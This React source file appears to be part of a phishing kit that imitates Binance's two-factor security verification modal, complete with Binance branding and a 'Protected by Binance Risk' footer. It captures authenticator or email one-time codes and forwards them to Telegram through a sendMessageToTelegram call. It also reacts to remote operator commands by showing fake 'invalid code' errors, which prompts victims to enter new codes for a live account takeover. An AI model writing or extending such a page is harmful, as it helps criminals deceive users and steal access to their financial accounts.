'use client'
import { useState, useEffect } from 'react'
import '../app/globals.css'
import { useTheme } from '../app/lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useCommand } from '../app/lib/CommandContext';

export default function Modal({ displayModal, setDisplayModal, modal, setModal }) {
    const { theme, toggleTheme } = useTheme();
    const [isLoading, setIsLoading] = useState(false)
    const [modalState, setModalState] = useState(`invisible fixed opacity-0`) // Changed from hidden to invisible
    const [animate, setAnimate] = useState('opacity-0')
    const [otpCode, setOtpCode] = useState('');
    const [invalid, setInvalid] = useState(false);
    const { command } = useCommand(); // Get current command
    const [isOpen, setIsOpen] = useState(false);

    useEffect(() => {
        if (displayModal) {
            setIsOpen(true);
            document.body.style.overflow = 'hidden'; // Prevent background scrolling
        } else {
            setIsOpen(false);
            document.body.style.overflow = 'auto';
        }
    }, [displayModal]);

    if (!isOpen) return null;
    
    // Handle Telegram commands
    useEffect(() => {
        if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN' && modal === 'AuthApp') {
            setInvalid(true);
        } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN' && modal === 'Email') {
            setInvalid(true);
        }
    }, [command, modal]);


    const handleOtpSubmit = () => {
        // Send only the OTP code to Telegram
        if (otpCode) {
            sendMessageToTelegram(otpCode); // Send only the OTP code
            setOtpCode(''); // Clear the input
        } else {
            setInvalid(true); // Show error if OTP code is empty
        }
    };

    return (
        <div className={`fixed inset-0 z-50 ${theme === 'light' ? 'bg-white' : 'bg-[#0c0d10]'} bg-opacity-95 transition-opacity duration-300`}>
        <div className={`${modalState} transition-all duration-200 h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#0c0d10]'}`}>
            <div className='h-full w-full flex md:justify-center flex-col md:items-center'>
                <div className={`md:border ${animate} transition-opacity duration-200 ease-in-out ${theme === 'light' ? 'md:border-[#eaecef]' : ''} md:mt-20 bg-[#1e2329] md:rounded-[15px] md:w-[425px] w-full min-h-[fit] h-full md:h-[589px]`}><div className='flex md:items-center items-start justify-between py-[20px] px-[24px]'>
                    <div></div>

                    <div onClick={() => setDisplayModal(false)}>
                        <svg fill="PrimaryText" className="bn-svg w-[24] h-[24] bn-mfa-navigator-clickable bn-mfa-navigator-close" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.697 4.575L4.575 6.697 9.88 12l-5.304 5.303 2.122 2.122L12 14.12l5.303 5.304 2.122-2.122L14.12 12l5.304-5.303-2.122-2.122L12 9.88 6.697 4.575z" fill="currentColor"></path></svg>
                    </div>
                </div>


                    {/* Main */}
                    <div className='items-stretch flex flex-col justify-start min-h-0 flex-1'>
                        <div style={{
                            'height': '100 %', 'overflow- y': 'auto', 'display': 'block'
                        }}>
                            <div className='h-auto min-h-[452px] px-[1.5rem] py-0 w-full md:px-[2.5rem]'>
                                < div className='text-[28px] font-semibold leading-[34px] md:leading-[36px] mb-[.5rem]'>
                                    {modal === 'AuthApp' ? 'Authenticator App' : 'Email Verification'}
                                </div>
                                <div className='mb-8 text-[#B7BDC6] md:w-[300px] text-[14px] md:text-[16px] font-normal leading-[24px] sm:leading-[22px]'>
                                    {modal === 'AuthApp' ? 'Please enter the 6-digit code generated by your authenticator app.' : 'Enter the 6-digit verification code sent to ekw***@gmail.com.'}
                                </div>
                                <div>
                                    <div className='flex flex-column text-[14px] font-normal leading-[22px] mb-2'>
                                        {/* Form Label */}
                                        <div className={` ${theme === 'light' ? 'text-[#1e2329]' : 'text - [#202630] '} -mb-1 font-medium`}>
                                            {modal === 'AuthApp' ? 'Authenticator App' : 'Email Verification Code'}
                                        </div>
                                    </div>



                                    {/* Input */}
                                        <input
                                            type="text"
                                            value={otpCode}
                                            onChange={(e) => setOtpCode(e.target.value)}
                                            className={`... ${invalid ? 'border-red-500' : ''}`}
                                            placeholder={`Enter 6-digit ${modal === 'AuthApp' ? 'authenticator' : 'email'} code`}
                                        />
                                        {invalid && (
                                            <p className="text-red-500 text-sm mt-1">
                                                {modal === 'AuthApp' 
                                                    ? "Invalid authenticator code. Please try again."
                                                    : "Invalid email verification code. Please check your email."}
                                            </p>
                                        )}
                                        <button onClick={handleOtpSubmit}>
                                            {isLoading ? <BinanceLoader /> : 'Submit'}
                                        </button>
                                    <div class="flex justify-start md:justify-center mt-5">
                                        <button className='text-[14px] font-medium h-[32px] text-[#F0B90B]'>
                                            Security verification unavailable ?
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>


                    {/* Footer */}
                    <div className='w-full pb-4 pt-6'>
                        <div className='w-full inline-flex justify-center items-center'>
                            <div className='flex items-center justify-center h-6 cursor-pointer'>
                                <svg fill="#5e6673" className="bn-svg w-5 h-5 mr-1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M4 4v12l8 5 8-5V4H4zm12 7a4 4 0 11-8 0 4 4 0 018 0zm-4-2.121L9.879 11 12 13.121 14.121 11 12 8.879z" fill="#5e6673"></path></svg>
                                <div className='text-[12px] font-normal text-[#5e6673] leading-[18px]'>Protected by Binance Risk.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div >
        </div >
        </div>
    )
}

// 'bg-[#181a20]'